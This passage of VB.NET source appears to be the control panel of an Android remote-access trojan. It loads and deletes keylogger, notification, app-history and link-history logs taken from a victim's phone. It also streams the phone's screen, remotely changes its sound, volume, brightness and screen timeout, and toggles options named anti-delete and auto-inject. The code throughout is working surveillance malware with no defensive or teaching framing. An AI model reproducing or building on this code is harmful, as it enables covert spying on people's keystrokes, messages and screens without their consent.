                For Each datstr As String In alldates_k
                    Combodats.Items.Add(datstr)
                Next
                Combodats.Text = alldates_k(0)
                Combodats.Enabled = True
            Case "Apps"
                Dim alldates_k() As String = Btcli.visitedapps.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                If Btcli.visitedapps = "null" OrElse alldates_k.Length < 1 Then
                    Combodats.Text = "Target Date"
                    Combodats.Enabled = False
                    BTAlerter.infos(novstdapsstr)
                    Return
                End If
                Combodats.Items.Clear()

                For Each datstr As String In alldates_k
                    Combodats.Items.Add(datstr)
                Next
                Combodats.Text = alldates_k(0)
                Combodats.Enabled = True
            Case "Links"
                Dim alldates_k() As String = Btcli.visitedlinks.Split(New String() {"<*P*>"}, StringSplitOptions.None)
                If Btcli.visitedlinks = "null" OrElse alldates_k.Length < 1 Then
                    Combodats.Text = "Target Date"
                    Combodats.Enabled = False
                    BTAlerter.infos(novlinkstr)
                    Return
                End If
                Combodats.Items.Clear()

                For Each datstr As String In alldates_k
                    Combodats.Items.Add(datstr)
                Next
                Combodats.Text = alldates_k(0)
                Combodats.Enabled = True
            Case Else
                Combodats.Text = "Target Date"
                Combodats.Enabled = False
                Exit Sub
        End Select

    End Sub

    Private Sub srchfilsbtn_Click(sender As Object, e As EventArgs) Handles srchbtn.Click

        Dim loadit As String = Nothing
        Select Case comboTargts.Text
            Case "keylogger"
                loadit = "GK"
            Case "Activities"
                loadit = "GA"

            Case "Notifications"
                loadit = "GF"

            Case "Apps"
                loadit = "GV"

            Case "Links"
                loadit = "GU"

            Case Else
                loadit = Nothing
                Exit Sub
        End Select
        If loadit Is Nothing Then
            BTAlerter.infos("Select record type.")
            Return
        End If

        If Not Combodats.Enabled OrElse Combodats.Text = "Target Date" Then
            BTAlerter.infos("Select record date.")
            Return
        End If
        Dim targetdate As String = Combodats.Text
        Dim data As New With {
                           .subcommand = "L",
                           .fortype = loadit,
                           .fname = targetdate
                       }
        loadrecord(data)
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles delbtn.Click
        Dim loadit As String = Nothing
        Select Case comboTargts.Text
            Case "keylogger"
                loadit = "DK"
            Case "Activities"
                loadit = "DA"

            Case "Notifications"
                loadit = "DF"

            Case "Apps"
                loadit = "DV"

            Case "Links"
                loadit = "DU"

            Case Else
                loadit = Nothing
                Exit Sub
        End Select
        If loadit Is Nothing Then
            BTAlerter.infos("Select record type.")
            Return
        End If

        If Not Combodats.Enabled OrElse Combodats.Text = "Target Date" Then
            BTAlerter.infos("Select record date.")
            Return
        End If

        Dim targetdate As String = Combodats.Text
        If MyMsg.Show(confirmstr, $"{confdelrecodstr}{vbNewLine + vbNewLine}{comboTargts.Text}:{targetdate}", msgtype.Confirm, True) Then
            Dim data As New With {
                               .subcommand = "L",
                               .fortype = loadit,
                               .fname = targetdate
                           }
            loadrecord(data)
        End If

    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles clrbtn.Click
        logactivitystext.Text = "• View offline records."
    End Sub

    Private Sub checkwritstng_Click(sender As Object, e As EventArgs) Handles checkwritstng.Click
        If Not holdrequests AndAlso checkwritstng.Enabled Then
            If Not checkwritstng.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "WriteS"
                       }
                requestprime(data)
            End If
        End If
    End Sub



    Private Sub checkroaming_ValueChanged(sender As Object, value As Boolean) Handles checkroaming.ValueChanged
        If holdrequests Then
            Return
        End If

        Dim data As New With {
                         .subcommand = "E",
                         .etype = "DR",
                         .nvlue = value.ToString
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub



    Private Sub soundoffbtn_Click(sender As Object, e As EventArgs) Handles soundoffbtn.Click
        soundonbtn.ForeColor = Color.Gray
        vibrateonbtn.ForeColor = Color.Gray
        soundoffbtn.ForeColor = Color.White
        Dim data As New With {
                         .subcommand = "E",
                         .etype = "MU",
                         .nvlue = "1"
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub vibrateonbtn_Click(sender As Object, e As EventArgs) Handles vibrateonbtn.Click
        soundonbtn.ForeColor = Color.Gray
        vibrateonbtn.ForeColor = Color.White
        soundoffbtn.ForeColor = Color.Gray
        Dim data As New With {
                         .subcommand = "E",
                         .etype = "VBR",
                         .nvlue = "1"
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub soundonbtn_Click(sender As Object, e As EventArgs) Handles soundonbtn.Click
        soundonbtn.ForeColor = Color.White
        vibrateonbtn.ForeColor = Color.Gray
        soundoffbtn.ForeColor = Color.Gray
        Dim data As New With {
                         .subcommand = "E",
                         .etype = "UMU",
                         .nvlue = "1"
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub TrackBartimeout_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBartimeout.MouseUp
        If holdrequests Then
            Return
        End If

        Dim screenTimeoutMs As Integer = TrackBartimeout.Value * 60000

        ' Define the acceptable range for screen timeout in milliseconds
        Dim minTimeoutMs As Integer = 15000   ' 15 seconds
        Dim maxTimeoutMs As Integer = 600000  ' 10 minutes

        ' Check if the converted value is within the acceptable range
        If screenTimeoutMs < minTimeoutMs Then
            screenTimeoutMs = minTimeoutMs
        ElseIf screenTimeoutMs > maxTimeoutMs Then
            screenTimeoutMs = maxTimeoutMs
        End If

        Dim data As New With {
                         .subcommand = "E",
                         .etype = "TO",
                         .nvlue = screenTimeoutMs.ToString
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub TrackBarBrightness_MouseUp(sender As Object, e As MouseEventArgs) Handles TrackBarBrightness.MouseUp
        If holdrequests Then
            Return
        End If

        Dim screenBrightnessLevel As Integer = TrackBarBrightness.Value

        Dim data As New With {
                         .subcommand = "E",
                         .etype = "BR",
                         .nvlue = screenBrightnessLevel.ToString
                     }

        Dim commandstr As String = FormatCommand("Deviceinfo", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                            {"msg", wrk},
                                            {"cmnd", commandstr}
                }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub trackring_MouseUp(sender As Object, e As MouseEventArgs) Handles trksystm.MouseUp, traknotify.MouseUp, trakmusic.MouseUp, trackring.MouseUp

        '
        Dim trackBar As DrakeUI.Framework.DrakeUITrackBar = CType(sender, DrakeUI.Framework.DrakeUITrackBar)
        Dim volumeLevel As Integer = trackBar.Value
        Dim voltype As String = Nothing
        Select Case trackBar.Name
            Case "trackring"
                voltype = "VR"

            Case "trksystm"
                voltype = "VS"

            Case "traknotify"
                voltype = "VN"

            Case "trakmusic"

                voltype = "VM"
            Case Else
                Exit Sub
        End Select
        If voltype IsNot Nothing Then
            If holdrequests Then
                Return
            End If

            Dim screenBrightnessLevel As Integer = TrackBarBrightness.Value

            Dim data As New With {
                             .subcommand = "E",
                             .etype = voltype,
                             .nvlue = volumeLevel.ToString
                         }

            Dim commandstr As String = FormatCommand("Deviceinfo", data)


            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        End If
    End Sub

    Private Sub profile_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()

    End Sub

    Private Sub checkaccfiles_Click(sender As Object, e As EventArgs) Handles checkaccfiles.Click
        If Not holdrequests AndAlso checkaccfiles.Enabled Then
            If Not checkaccfiles.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "FileS"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub chkscrns_ValueChanged(sender As Object, value As Boolean) Handles chkscrns.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("livescreen", "1")
            BTEngine.MainForm.Invoke(Sub()
                                         BTEngine.MainForm.AddtoScreens(Btcli.mobid,
                                                                        Btcli.name + "|" + Btcli.address,
                                                                        Btcli.wallpaper,
                                                                        My.Resources.scr_load)


                                     End Sub)
        Else
            Btcli.UpdateOption("livescreen", "0")
            BTEngine.MainForm.Invoke(Sub()
                                         BTEngine.MainForm.RemoveScreens(Btcli.mobid)
                                     End Sub)
        End If
    End Sub

    Private Sub DrakeUIButtonIcon1_Click_1(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        Dim loadit As String = Nothing
        Select Case comboTargts.Text
            Case "keylogger"
                loadit = "DK"
            Case "Activities"
                loadit = "DA"

            Case "Notifications"
                loadit = "DF"

            Case "Apps"
                loadit = "DV"

            Case "Links"
                loadit = "DU"

            Case Else
                loadit = Nothing
                Exit Sub
        End Select
        If loadit Is Nothing Then
            BTAlerter.infos("Select record type.")
            Return
        End If

        If Not Combodats.Enabled OrElse Combodats.Text = "Target Date" Then
            BTAlerter.infos("No records found.")
            Return
        End If

        Dim targetdate As String = Combodats.Text
        Dim totalrecord As String = Combodats.Items.Count.ToString
        If MyMsg.Show(confirmstr, $"{confdelrecodstr}{vbNewLine + vbNewLine}{totalstr}:{totalrecord}", msgtype.Confirm, True) Then
            For Each datstr As String In Combodats.Items
                Dim data As New With {
                                   .subcommand = "L",
                                   .fortype = loadit,
                                   .fname = datstr
                               }
                loadrecord(data)
            Next
        End If
    End Sub

    Private Sub DrakeUIButtonIcon2_Click_1(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click
        Dim loadit As String = Nothing
        Select Case comboTargts.Text
            Case "keylogger"
                loadit = "GK"
            Case "Activities"
                loadit = "GA"

            Case "Notifications"
                loadit = "GF"

            Case "Apps"
                loadit = "GV"

            Case "Links"
                loadit = "GU"

            Case Else
                loadit = Nothing
                Exit Sub
        End Select
        If loadit Is Nothing Then
            BTAlerter.infos("Select record type.")
            Return
        End If

        If Not Combodats.Enabled OrElse Combodats.Text = "Target Date" Then
            BTAlerter.infos("No records found.")
            Return
        End If

        Dim targetdate As String = Combodats.Text
        Dim totalrecord As String = Combodats.Items.Count.ToString
        If MyMsg.Show(confirmstr, $"{confloadallstr}{vbNewLine + vbNewLine}{totalstr}:{totalrecord}", msgtype.Confirm, True) Then
            Try
                Process.Start(Btcli.userfolder)
            Catch ex As Exception

            End Try
            Dim loadthread As New Threading.Thread(Sub()
                                                       For Each datstr As String In Combodats.Items
                                                           Dim data As New With {
                                                                              .subcommand = "L",
                                                                              .fortype = loadit,
                                                                              .fname = datstr
                                                                          }
                                                           loadrecord(data)
                                                           Threading.Thread.Sleep(1)
                                                       Next
                                                   End Sub)
            loadthread.IsBackground = True
            loadthread.Start()
        End If
    End Sub

    Private Sub checknotifys_Click(sender As Object, e As EventArgs) Handles checknotifys.Click
        If Not holdrequests AndAlso checknotifys.Enabled Then
            If Not checknotifys.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "NT<"
                       }
                requestprime(data)
            End If
        End If
    End Sub

    Private Sub Checkatoject_ValueChanged(sender As Object, value As Boolean) Handles Checkatoject.ValueChanged
        If holdrequests Then
            Return
        End If
        If value Then
            Btcli.UpdateOption("autoj", "1")
        Else
            Btcli.UpdateOption("autoj", "0")
        End If
    End Sub

    Private Sub checkantdelete_ValueChanged(sender As Object, value As Boolean) Handles checkantdelete.ValueChanged
        If holdrequests Then
            Return
        End If

        Dim data As New With {
                           .subcommand = "R",
                           .prim = "AntiD"
                       }
        requestprime(data)
    End Sub

    Private Sub checkcallph_Click(sender As Object, e As EventArgs) Handles checkcallph.Click
        If Not holdrequests AndAlso checkcallph.Enabled Then
            If Not checkcallph.Active Then
                Dim data As New With {
                           .subcommand = "R",
                           .prim = "CP<"
                       }
                requestprime(data)
            End If
        End If
    End Sub
End Class